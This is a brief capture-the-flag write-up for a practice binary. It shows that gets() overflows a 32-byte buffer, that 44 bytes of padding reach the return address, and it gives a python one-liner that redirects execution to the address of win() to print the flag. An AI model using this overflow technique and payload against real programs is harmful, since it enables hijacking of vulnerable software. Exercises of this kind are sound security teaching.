Writeup: buffer overflow 1

in vuln.c the buffer is size 32

inside the function vuln() there is a call to gets() which reads to the buffer
after entering 44 characters the next 4 bytes will overwrite the eip

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[4 bytes]

want to get to 080485cb where function win() is since it will print flag

address of win in little endian format
\xcb\x85\x04\x08

input string to program
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcb\x85\x04\x08

python -c 'print("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcb\x85\x04\x08")' | ./vuln
